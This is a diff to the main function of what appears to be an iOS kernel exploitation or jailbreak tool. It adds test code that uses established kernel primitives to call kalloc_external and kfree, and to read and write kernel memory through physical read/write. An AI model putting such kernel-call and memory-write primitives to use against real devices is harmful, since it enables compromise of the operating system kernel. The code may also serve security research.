@@ -67,7 +67,20 @@ int main(int argc, char *argv[], char *envp[]) {
 		uint64_t kret = kexecute(ksym(KSYMBOL_RET_300), 1, 0, 0, 0, 0, 0, 0);
 		printf("kexecute KSYMBOL_RET_300 kret = %llu\n", kret);
 
+		//kernel mapping with phys r/w
 		physrw_handoff(getpid());
+
+		const uint64_t kalloc_sz = 0x100;
+		uint64_t kptr = kcall8(ksym(KSYMBOL_KALLOC_EXTERNAL), kalloc_sz, 0, 0, 0, 0, 0, 0, 0);
+		printf("kcall8 KSYMBOL_KALLOC_EXTERNAL(0x%llx) kptr = 0x%llx\n", kalloc_sz, kptr);
+
+		kwrite64_phys(kptr, 0xCAFEBABE41424344);
+		printf("kread64_phys(kbase) = 0x%llx\n", kread64_phys(kbase));
+		printf("kread64_phys(kptr) = 0x%llx\n", kread64_phys(kptr));
+		
+
+		kret = kcall8(ksym(KSYMBOL_KFREE), kptr, kalloc_sz, 0, 0, 0, 0, 0, 0);
+		printf("kcall8 KSYMBOL_KFREE kret = 0x%llx\n", kret);
 
 		// kret = kfunc_kvtophys(kbase);
 		// printf("kfunc_kvtophys kret = 0x%llx\n", kret);
